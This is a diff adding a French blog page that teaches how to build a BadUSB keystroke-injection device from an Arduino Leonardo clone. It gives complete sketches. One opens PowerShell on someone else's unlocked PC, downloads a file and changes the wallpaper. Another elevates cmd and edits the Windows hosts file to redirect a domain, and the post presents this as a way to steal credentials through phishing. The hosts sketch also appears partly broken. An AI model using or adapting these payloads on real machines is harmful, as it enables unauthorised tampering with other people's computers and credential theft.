@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=" en "><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tuto - BadUSB Atmega32U4 | Vixepti</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="Tuto - BadUSB Atmega32U4" />
+<meta name="author" content="Vixepti" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Dans cet article, on va utiliser une BadUSB basé sur un Atmega32U4 (Arduino leonardo) à 3,5€." />
+<meta property="og:description" content="Dans cet article, on va utiliser une BadUSB basé sur un Atmega32U4 (Arduino leonardo) à 3,5€." />
+<link rel="canonical" href="http://localhost:4000/hacking/2020/01/12/bad-usb-atmega32u4.html" />
+<meta property="og:url" content="http://localhost:4000/hacking/2020/01/12/bad-usb-atmega32u4.html" />
+<meta property="og:site_name" content="Vixepti" />
+<meta property="og:image" content="http://localhost:4000/assets/2020/01/bad-usb-32u4-thumbnail.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-01-12T02:07:42+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/2020/01/bad-usb-32u4-thumbnail.jpg" />
+<meta property="twitter:title" content="Tuto - BadUSB Atmega32U4" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Vixepti"},"dateModified":"2020-01-12T02:07:42+01:00","datePublished":"2020-01-12T02:07:42+01:00","description":"Dans cet article, on va utiliser une BadUSB basé sur un Atmega32U4 (Arduino leonardo) à 3,5€.","headline":"Tuto - BadUSB Atmega32U4","image":"http://localhost:4000/assets/2020/01/bad-usb-32u4-thumbnail.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hacking/2020/01/12/bad-usb-atmega32u4.html"},"url":"http://localhost:4000/hacking/2020/01/12/bad-usb-atmega32u4.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Vixepti" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Vixepti</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">À propos</a><a class="page-link" href="/categories/">Catégories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Tuto - BadUSB Atmega32U4</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-01-12T02:07:42+01:00" itemprop="datePublished">Jan 12, 2020
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">Vixepti</span></span></p>
+      <hr>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Dans cet article, on va utiliser une BadUSB basé sur un Atmega32U4 (Arduino leonardo) à 3,5€. <!--more--> On la trouve sous le nom de BadUSB Beetle Bad, BadUSB Lily GO, BadUSB Atmega32U4, peut importe… Elle est similaire à l’USB Rubber Ducky. Elle agit en tant que périphérique HID, en réalisant des entrées clavier / souris automatiquement et très rapidement.</p>
+
+<h2 id="une-badusb-cest-quoi-">Une BadUSB, c’est quoi ?</h2>
+
+<p>C’est un petit dispositif USB permettant se faisant passer pour un périphérique <a href="https://en.wikipedia.org/wiki/USB_human_interface_device_class">USB-HID</a> (clavier, souris), et qui va réaliser des entrées clavier / souris automatiquement et surtout très rapidement.</p>
+
+<h2 id="configuration-de-lenvironnement">Configuration de l’environnement</h2>
+
+<p>Tout d’abord nous allons utiliser le logiciel <strong>Arduino</strong>. S’il n’est pas installé, vous pouvez le trouver sur le <a href="https://www.arduino.cc/en/main/software">site officiel</a>. Sur windows, comme d’habitude, il suffit de lancer l’exécutable et faire suivant plein de fois. Pour linux, tout dépends de la distribution. J’utilise personnellement Manjaro, il est dans les dépôts mais c’est pas la dernière vesion alors je l’installe depuis le <a href="https://www.arduino.cc/en/Guide/Linux">repo github</a> grâce à <em>yay</em>.</p>
+
+<p>Normalement, il n’y a rien à faire dans le <em>Gestionnaire de cartes</em>, car c’est un arduino leonardo, qui est géré par défaut dans le logiciel.</p>
+
+<p>Il faut également installer les librairies <strong>Keyboard</strong> et <strong>Mouse</strong>. Pour ça on va dans <em>Outils</em> -&gt; <em>Gestionnaire de bibliotèque</em> et on chercher <em>keyboard</em>. Puis on installe les deux librairies :</p>
+
+<p><a href="/assets/2020/01/badusb_keyboard-mouse-libs.png"><img src="/assets/2020/01/badusb_keyboard-mouse-libs.png" alt="Librairies arduino Keyboard et Mouse" /></a></p>
+
+<p><strong><em>Pour les claviers AZERTY :</em></strong></p>
+
+<p>La librairie <strong>Keyboard</strong> a été faite pour les claviers QWERTY. Donc si on tape par exemple un <em>A</em>, on aura un <em>Q</em>.</p>
+
+<p>Pour contourner le problème, la librairie a été adaptée en AZERTY dans <a href="https://github.com/martin-leo/KeyboardAzertyFr">KeyboardAzertyFR disponible sur github</a>.</p>
+
+<p>Quelques caractères foireux persistent (par exemple : <code class="highlighter-rouge">\</code> ). Pour résoudre ce problème, il y a un <a href="https://forum.arduino.cc/index.php?topic=552465.0">tuto intéressant</a> sur le forum arduino. En fait il s’agit d’ajouter la fonction suivante :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">keyboardScanCode</span><span class="p">(</span><span class="n">byte</span> <span class="n">code</span><span class="p">){</span>
+    <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+    <span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<h2 id="ecrire-des-programmes">Ecrire des programmes</h2>
+
+<p>Pour tous les programmes, la première chose à faire est d’inclure la librairie que l’on va utiliser (<em>Keyboard.h</em> ou <em>Mouse.h</em>) :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;Keyboard.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;KeyboardAzertyFr.h&gt;</span><span class="c1"> // pour les claviers AZERTY (voir plus haut dans l'article)</span><span class="cp">
+#include</span> <span class="cpf">&lt;Mouse.h&gt;</span></code></pre></figure>
+
+<p>La pluspart du temps, on va écrire le programme dans la fonction <em>setup()</em>. En effet, on ne veut généralement pas que le programme soit exécuté en boucle, on laisse donc <em>loop()</em> vide.</p>
+
+<p>Pour indiquer à l’arduino (la clé usb) qu’il doit commencer à émuler un clavier, on utilisera :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+<span class="c1">// OU, pour un clavier AZERTY :</span>
+<span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span></code></pre></figure>
+
+<p>Et pour arrêter l’émulation :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">Keyboard</span><span class="p">.</span><span class="n">end</span><span class="p">();</span>
+<span class="c1">// OU, pour un clavier AZERTY :</span>
+<span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">end</span><span class="p">();</span></code></pre></figure>
+
+<h3 id="fonctions-utiles">Fonctions utiles</h3>
+
+<blockquote>
+  <p>Pour des questions de simplicité, à partir d’ici, je ne vais noter que les notations utilisant la librairie <em>KeyboardAzertyFr</em>. Mais libre à chacun d’utiliser <em>Keyboard</em>.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p><em>press()</em> : Effectue un enfoncement de touche sans relâchement. Il faut utiliser <em>release()</em> ou <em>releaseAll()</em> pour relâcher la touche.</p>
+  </li>
+  <li>
+    <p><em>print()</em> : Effectue une frappe clavier (enfoncement et relâchement “normal”).</p>
+  </li>
+  <li>
+    <p><em>println()</em> : Effectue une frappe clavier puis un retour chariot.</p>
+  </li>
+  <li>
+    <p><em>release()</em> : Relâche la touche passée en argument.</p>
+  </li>
+  <li>
+    <p><em>releaseAll()</em> : Relâche toutes les touches actuellement enfoncées (avec <em>press()</em>).</p>
+  </li>
+  <li>
+    <p><em>write()</em> : Effectue une frappe clavier ou un enchaînement de frappes. Permet d’envoyer un ou plusieurs caractères. Supporte les caractères normaux et les codes ASCII, en décimal, hexadécimal et binaire.</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">Keyboard</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">86</span><span class="p">);</span>         <span class="c1">// Valeur ASCII pour V</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sc">'V'</span><span class="p">);</span>        <span class="c1">// V en char</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mh">0x56</span><span class="p">);</span>       <span class="c1">// Valeur hexadecimal pour V</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mb">0b01010110</span><span class="p">);</span> <span class="c1">// Valeur binaire pour V</span></code></pre></figure>
+
+<ul>
+  <li><strong><em>delay()</em></strong> : Une des fonctions les plus utiles. Elle permet de faire attendre le programme un certain temps avant de continuer. Ici, on s’en sert pour réguler la vitesse de frappe clavier. Lorsqu’on lance un programme, celui-ci ne s’ouvre et s’affiche pas instantannément (surtout si le PC est lent). On attends donc 2000 ms par exemple, puis on continue. On évite ainsi de taper dans le vide.</li>
+</ul>
+
+<h2 id="exemples-dapplication">Exemples d’application</h2>
+
+<blockquote>
+  <p>Je posterai tous les programmes que j’écris sur mon github : <a href="https://github.com/Vixepti/BadUSB-Scripts">https://github.com/Vixepti/BadUSB-Scripts</a>
+Pour l’instant il n’y a pas grand chose, mais j’ajouterai au fur et à mesure…
+Si vous avez des suggestions, je suis aussi preneur !</p>
+</blockquote>
+
+<h3 id="pranks">Pranks</h3>
+<p>On peut ce servir de ce type de périphérique pour faire des blagues aux copains. Par exemple, quelqu’un laisse son PC déverrouillé en partant (même 30 secondes). J’en profite pour brancher la clé, et avec le bon programme, il se retrouve avec un fond d’écran teletubbies :</p>
+
+<div class="youtube-embed">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+</div>
+
+<p>Le programme pour windows que j’ai utilisé est le suivant :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;KeyboardAzertyFr.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">keyboardScanCode</span><span class="p">(</span><span class="n">byte</span> <span class="n">code</span><span class="p">){</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Used to print backslashs</span>
+<span class="kt">void</span> <span class="n">backslash</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_CTRL</span><span class="p">);</span>
+  <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_ALT</span><span class="p">);</span>
+  <span class="n">keyboardScanCode</span><span class="p">(</span><span class="mi">37</span><span class="p">);</span>
+  <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_ALT</span><span class="p">);</span>
+  <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_CTRL</span><span class="p">);</span>  
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">setup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+
+<span class="c1">// Open Windows start menu, pressing "Left Windows Key"</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+
+<span class="c1">// Open powershell</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">);</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+
+<span class="c1">// Prepare Download</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"$client=new-object System.Net.WebClient"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+
+<span class="c1">// Download image file (CHANGE URL IF YOU DON'T LIKE TELETUBBIES, CHANGE FILENAME "wallpaper.jpg" IF YOU NEED TO)</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"$client.DownloadFile(</span><span class="se">\"</span><span class="s">http://getwallpapers.com/wallpaper/full/0/e/2/1209647-teletubbies-wallpaper-hd-1920x1080-for-computer.jpg</span><span class="se">\"</span><span class="s"> , </span><span class="se">\"</span><span class="s">wallpaper.jpg</span><span class="se">\"</span><span class="s">)"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">1500</span><span class="p">);</span>
+
+<span class="c1">// Change Wallpaper</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"set-itemproperty HKCU:"</span><span class="p">);</span> <span class="c1">// Start modifying windows register</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">Control Panel"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Desktop</span><span class="se">\"</span><span class="s"> WallPaper </span><span class="se">\"</span><span class="s">%USERPROFILE%/wallpaper.jpg</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span> <span class="c1">// End modifying register. CHANGE FILENAME "wallpaper.jpg" IF YOU NEED TO</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+
+<span class="c1">// Refresh user settings to apply new wallpaper.</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters, 1, True"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+
+<span class="c1">// Exit powershell</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"exit"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="n">loop</span><span class="p">()</span> <span class="p">{}</span></code></pre></figure>
+
+<p>Son fonctionnement est un peu aléatoire pour l’instant. Je ne suis pas certain que l’utilisation de <em>UpdatePerUserSystemParameters</em> soit la meilleur solution, mais je n’ai pas eu le temps de trouver mieux. Parfois le fond d’écran est changé tout de suite, d’autres fois, il l’est à la prochaine ouverture de session (ça fait aussi son petit effet).</p>
+
+<h3 id="hacks">Hacks</h3>
+
+<p>Les farces, c’est marrant mais ça sert à rien. En revanche, niveau sécurité, ces petits outils sont de vrais bijoux. Les ports USB étant rarement désactivés, avec un accès à la machine, les possibilités sont quasi-infinis.</p>
+
+<p>On peut par exemple modifier le fichier <em>hosts</em> d’un PC pour rediriger toutes les requêtes envoyé à une adresse vers une autre. Cette dernière pourrait éventuellement être une page de phishing qui volerait des identifiants :</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;KeyboardAzertyFr.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">keyboardScanCode</span><span class="p">(</span><span class="n">byte</span> <span class="n">code</span><span class="p">){</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">136</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">backslash</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_CTRL</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_ALT</span><span class="p">);</span>
+    <span class="n">keyboardScanCode</span><span class="p">(</span><span class="mi">37</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_ALT</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_CTRL</span><span class="p">);</span>  
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">setup</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  
+<span class="c1">//open comand prompt</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">300</span><span class="p">);</span>
+    
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_CTRL</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_SHIFT</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_ALT</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'o'</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+  
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  
+<span class="c1">//insert 192.168.0.42</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"ECHO. &gt;&gt; C:"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"WINDOWS"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"SYSTEM32"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"DRIVERS"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"ETC"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"HOSTS"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"ECHO 192.168.0.42 example.lolcat &gt;&gt; C:"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"ECHO. &gt;&gt; C:"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"WINDOWS"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"SYSTEM32"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"DRIVERS"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"ETC"</span><span class="p">);</span>
+    <span class="n">backslash</span><span class="p">();</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"HOSTS"</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+    <span class="n">KeyboardAzertyFr</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+    <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">loop</span><span class="p">()</span> <span class="p">{}</span></code></pre></figure>
+
+
+  </div>
+
+  
+    <hr><br>
+    <span>Tags :</span>
+    <div class="tags">
+      <ul>
+        
+          <li><span class="tag">badusb</span></li>    
+        
+          <li><span class="tag">beetle bad</span></li>    
+        
+          <li><span class="tag">lilygo</span></li>    
+        
+          <li><span class="tag">atmega32u4</span></li>    
+        
+          <li><span class="tag">leonardo</span></li>    
+        
+          <li><span class="tag">arduino</span></li>    
+        
+          <li><span class="tag">HID</span></li>    
+        
+          <li><span class="tag">USB Rubber Ducky</span></li>    
+        
+      </ul>
+    </div>
+  <a class="u-url" href="/hacking/2020/01/12/bad-usb-atmega32u4.html" hidden></a>
+
+  
+</article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Vixepti</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Vixepti</li><li><a class="u-email" href="mailto:contact@vixepti.fr">contact@vixepti.fr</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/vixepti"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">vixepti</span></a></li><li><a href="https://www.twitter.com/vixepti"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">vixepti</span></a></li><li><a href="https://youtube.com/vixepti"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#youtube"></use></svg> <span class="username">vixepti</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Administration systèmes et réseaux, Sécurité informatique, Hacking, Bricolage et autres joyeusetés...</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
